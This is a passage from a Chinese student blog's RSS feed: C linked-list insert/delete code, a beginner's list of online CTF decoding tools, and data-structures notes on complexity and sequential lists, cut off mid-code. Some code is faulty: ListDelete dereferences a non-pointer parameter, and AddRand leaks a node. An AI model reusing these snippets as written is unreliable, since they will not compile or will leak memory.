title="添加"></a>添加</h4><h5 id="头添加-1"><a href="#头添加-1" class="headerlink" title="头添加"></a>头添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">// 头添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span><span class="comment">//创建一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"内存不足\n"</span>);<span class="comment">// 一般不会申请失败，除非内存不足</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">pTemp-&gt;next = head-&gt;next;</span><br><span class="line">head-&gt;next = pTemp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾添加-1"><a href="#尾添加-1" class="headerlink" title="尾添加"></a>尾添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//尾添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span><span class="comment">//创建一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"内存不足\n"</span>);<span class="comment">// 一般不会申请失败，除非内存不足</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">tail-&gt;next = pTemp;</span><br><span class="line">tail = pTemp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置添加-1"><a href="#任意位置添加-1" class="headerlink" title="任意位置添加"></a>任意位置添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRand</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> n)</span><span class="comment">//在数字index后面添加数字a</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找index节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">SearchNode</span>(<span class="title">index</span>);</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"查无此节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到节点,连接到指定位置</span></span><br><span class="line"><span class="comment">//创建节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pNode</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span></span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == tail)</span><br><span class="line">{</span><br><span class="line">AddTail(n);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pNode-&gt;next = pTemp-&gt;next;</span><br><span class="line">pTemp-&gt;next = pNode;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><h5 id="头删除-1"><a href="#头删除-1" class="headerlink" title="头删除"></a>头删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span><span class="comment">//删除头</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无头"</span>); </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有节点 ——&gt; 删除  </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span> <span class="comment">//记录头</span></span><br><span class="line">head-&gt;next = head-&gt;next-&gt;next;  <span class="comment">//变头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(pTemp);<span class="comment">//释放</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾删除-1"><a href="#尾删除-1" class="headerlink" title="尾删除"></a>尾删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span><span class="comment">//删除尾</span></span></span><br><span class="line"><span class="function"></span>{ </span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无尾"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有一个节点 ——&gt; 删除</span></span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(tail);</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">tail = head;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">struct Node* pTemp = head-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(pTemp-&gt;next == tail)</span><br><span class="line">{ </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//pTemp就是尾巴的前一个</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(tail); <span class="comment">//释放尾巴</span></span><br><span class="line">tail = pTemp; <span class="comment">//更新尾巴</span></span><br><span class="line">tail-&gt;next = <span class="literal">NULL</span>; <span class="comment">//尾巴下一个赋值为NULL</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>到这里，剩下的操作和无空头的没啥区别，这里就不多说了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/ad6fb827/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CTF常用工具汇总</title>
      <link>https://www.los-kos.cn/posts/ctf-tools/</link>
      <guid>https://www.los-kos.cn/posts/ctf-tools/</guid>
      <pubDate>Mon, 17 Feb 2020 13:00:32 GMT</pubDate>
      <description>
      
        Misc和Crypto一些工具的集合，都会整理在这里
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>假期做了很多CTF的题目，刚学没多久，只会简单的MISC和CRYPTO，网上搜集各种解密类型，</p><p>一个个去尝试，先整理一波；</p><a id="more"></a><p>整理这个是因为收藏夹满了，工具堆叠太多（噗哈哈哈，其实因为自己太懒，不想做题的时候再去搜），话不多说</p><p>直接上网址；</p><h4 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h4><p>之前就喜欢密码学，了解的不是很多，但是感觉超厉害！！！Very Good！！！</p><p>做了题目知道了很多密码：Base64，ROT13，摩斯密码，凯撒密码，栅栏密码，幂数加密（计算就可以，或者写</p><p>个脚本），RSA加密（到现在还没看懂原理emmm）</p><p><a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a>   </p><p><a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a>    </p><p><a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a>  </p><p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a> </p><p><a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a> </p><p><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a>  </p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a> </p><p><a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a>   </p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Ook</a> </p><p><a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Brainfuck</a>  </p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a>  </p><p><a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a>  </p><p><a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><p><a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a></p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累</a></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><p>杂项题目更头疼，五花八门的解密方法，确实让人头疼。还得精通ps（真是佩服），有一道p二维码的题，p了一</p><p>个晚上；</p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;</a></p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>CTF是个很好玩的“游戏”，现在虽然是个小白，但是我要努力成为大佬，题目越做越多，后面再进行整理。</p><p>Fighting！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/ctf-tools/#disqus_thread</comments>
    </item>
    
    <item>
      <title>数据结构</title>
      <link>https://www.los-kos.cn/posts/shujujiegou/</link>
      <guid>https://www.los-kos.cn/posts/shujujiegou/</guid>
      <pubDate>Sat, 15 Feb 2020 07:44:13 GMT</pubDate>
      <description>
      
        大一下开设的课程，记录学习笔记和一些问题
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>数据结构是学习语言过程中必会内容，对以后做项目，工作会有很大的帮助；</p><p>下学期开数据结构课，所以将学习记的一些笔记写进blog里面；</p><p>后面会不定时的更新；</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h2 id="数据结构概念"><a href="#数据结构概念" class="headerlink" title="数据结构概念"></a>数据结构概念</h2><p>数据结构：是相互之间存在一种或多种特定关系的数据结构元素的集合；</p><h2 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h2><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成；</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p><strong>程序 = 数据结构 + 算法；</strong></p><h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>定义：算法的时间复杂度，也就是算法的时间量度，记作：T(n) = O(f(n))(T(n)是语句总的执行次数)，它表示随问</p><p>题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称作算法的渐进时间复杂度，简称为时间复杂度。</p><p>其中f(n)是问题的规模n的某个函数；</p><h2 id="推导大O阶方法"><a href="#推导大O阶方法" class="headerlink" title="推导大O阶方法"></a>推导大O阶方法</h2><p>1、用常数1取代运行时间中的所有加法常数；</p><p>2、在修改后的运行次数函数中，只保留最高阶项；</p><p>3、如果最高阶项存在且不是1，则去除与这个项相乘的常数；</p><p>得到的的结果就是大O阶；</p><h2 id="常见的时间复杂度"><a href="#常见的时间复杂度" class="headerlink" title="常见的时间复杂度"></a>常见的时间复杂度</h2><p>常数阶    ——&gt;    O(1)</p><p>线性阶    ——&gt;    O(n)</p><p>平方阶    ——&gt;    O(n^2)</p><p>对数阶    ——&gt;    O(logn)</p><p><u>nlogn</u>阶  ——&gt;    O(nlogn)</p><p>立方阶    ——&gt;    O(n^3)</p><p>指数阶    ——&gt;    O(2^n)</p><h2 id="常见的时间复杂度所耗时间的大小排列"><a href="#常见的时间复杂度所耗时间的大小排列" class="headerlink" title="常见的时间复杂度所耗时间的大小排列"></a>常见的时间复杂度所耗时间的大小排列</h2><p><strong>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>算法的时间复杂度内容不多，很好理解，从下一章开始就将进入代码的世界；</p><p>拜拜啦~</p><h1 id="线性表—Linear-List"><a href="#线性表—Linear-List" class="headerlink" title="线性表—Linear List"></a>线性表—Linear List</h1><p>学完时间复杂度，基本打开了数据结构的大门了，第一个我们来学线性表~</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>1、定义：n(n≥0)个<u>数据元素</u>的有限序列；</p><p>2、线性表是一种最常用且最简单的数据结构，含有n个元素的线性表是一个数据结构；</p><p>3、List = (D,R)  ——&gt;  D是data数据，R是relation关系；</p><h2 id="前驱后继"><a href="#前驱后继" class="headerlink" title="前驱后继"></a>前驱后继</h2><p>若将线性表记为a1,a2,a3……ai-1,ai,ai+1……an,则称ai-1是ai的直接前驱元素，ai+1是ai的直接后继元素。当</p><p>i=1,2,3…n-1时，ai有且仅有一个直接后继，当i=2,3,4…n时，ai有且仅有一个直接前驱；</p><p>所以，线性表的元素的个数n(n≥0)定义为线性表的长度，当n=0时，称为空表；</p><h2 id="线性表的抽象数据类型——基本操作-增-删-查-取-空-长"><a href="#线性表的抽象数据类型——基本操作-增-删-查-取-空-长" class="headerlink" title="线性表的抽象数据类型——基本操作( 增 删 查 取 空 长 )"></a>线性表的抽象数据类型——基本操作( 增 删 查 取 空 长 )</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitList(*L) <span class="comment">//初始化,建立一个新的线性表L；</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、ListEmpty(L) <span class="comment">//线性表为空，返回true，否则返回false；</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、ListLength(L) <span class="comment">//求长度，返回线性表中元素的个数；</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、GetElem(L,i,*e) <span class="comment">//将线性表L中第i个数据元素赋值给e；</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、LocateElem(L,e) <span class="comment">//在线性表L中查找与给定值e相等的元素，如果查找成功，返回该元素在表中序号表示成功，否则，返回0表示失败；</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、ListInsert(*L,i,e) <span class="comment">//在线性表L中第i个位置插入新的数据e，表长+1；</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、ListDelete(*L,i,e) <span class="comment">//删除线性表L中第i个数据元素，e返回其值，表长-1；</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、ClearList(*L) <span class="comment">//将线性表清空；</span></span><br></pre></td></tr></tbody></table></figure><h2 id="线性表的顺序存储结构——顺序表"><a href="#线性表的顺序存储结构——顺序表" class="headerlink" title="线性表的顺序存储结构——顺序表"></a>线性表的顺序存储结构——顺序表</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>线性表的顺序存储结构，指的是用一段地址连续的储存单元依次储存线性表的数据元素；</p><h3 id="顺序储存方式"><a href="#顺序储存方式" class="headerlink" title="顺序储存方式"></a>顺序储存方式</h3><p>先来看看结构代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000  <span class="comment">//储存空间初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> length;  <span class="comment">//线性表当前长度</span></span><br><span class="line">}SqList;</span><br></pre></td></tr></tbody></table></figure><h3 id="顺序表的操作"><a href="#顺序表的操作" class="headerlink" title="顺序表的操作"></a>顺序表的操作</h3><h4 id="获得元素操作"><a href="#获得元素操作" class="headerlink" title="获得元素操作"></a>获得元素操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetElem</span><span class="params">(SqList L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//获得元素——&gt;e返回L中第i个数据元素的值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (L.length == <span class="number">0</span> || i&lt;<span class="number">1</span> || i&gt;L.length)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = L.data[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(SqList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//插入操作——&gt;在L中第i个位置之前插入新的数据元素e，L的长度加1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (L-&gt;length == MAXSIZE) <span class="comment">//线性表已满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length + <span class="number">1</span>) <span class="comment">//i不在范围内</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i &lt;= L-&gt;length) <span class="comment">//插入的元素不在表尾 (可加if可不加)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = L-&gt;length - <span class="number">1</span>; k &gt;= i - <span class="number">1</span>; k--)</span><br><span class="line">{</span><br><span class="line">L-&gt;data[k + <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">L-&gt;data[i - <span class="number">1</span>] = e; <span class="comment">//新元素插入</span></span><br><span class="line">L-&gt;length++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(SqList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//删除操作</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>) <span class="comment">//线性表为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length) <span class="comment">//删除位置不正确</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (i &lt; L-&gt;length) <span class="comment">//删除不是最后位置</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = i; k &lt; L-&gt;length; k++) <span class="comment">//删除位置后继元素前移</span></span><br><span class="line">{</span><br><span class="line">L-&gt;data[k - <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">L-&gt;length--;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong><em>1、优点：</em></strong></p><p><strong><em>①无需为表中元素之间的逻辑关系增加额外的储存空间；</em></strong></p><p><strong><em>②可以快速的存取表中任意位置的元素；</em></strong></p><p><strong><em>2、缺点：</em></strong></p><p><strong><em>①插入和删除操作需要移动大量元素；</em></strong></p><p><strong><em>②当线性表长度变化较大时，难以确定储存空间的容量；</em></strong></p><p><strong><em>③造成储存空间的“碎片”；</em></strong></p><h2 id="线性表的链式储存结构——链表"><a href="#线性表的链式储存结构——链表" class="headerlink" title="线性表的链式储存结构——链表"></a>线性表的链式储存结构——链表</h2><p>链表在之前的博客里面已经整理了一部分，在这里再整理一遍吧；</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>先定义一个结构体</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">}Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span> <span class="comment">//定义LinkList</span></span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的读取"><a href="#单链表的读取" class="headerlink" title="单链表的读取"></a>单链表的读取</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> 